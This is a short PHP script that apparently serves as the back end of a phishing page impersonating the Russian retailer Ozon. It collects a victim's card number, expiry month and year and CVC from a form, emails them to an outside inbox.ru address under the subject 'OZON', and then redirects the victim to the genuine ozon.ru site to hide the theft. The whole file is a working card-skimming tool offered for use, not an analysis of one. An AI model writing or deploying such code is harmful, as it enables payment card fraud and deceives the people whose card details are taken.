<?php
$message = $_POST['fcard'] . ':' . $_POST['fexpm'] . ':' . $_POST['fexpy'] . ':' . $_POST['fcvc'];
$message = wordwrap($message, 70, "<br>");
mail('mvd.akademiya@inbox.ru', 'OZON', $message, "From: example@mail.ru");
header('Location: https://www.ozon.ru/');
?>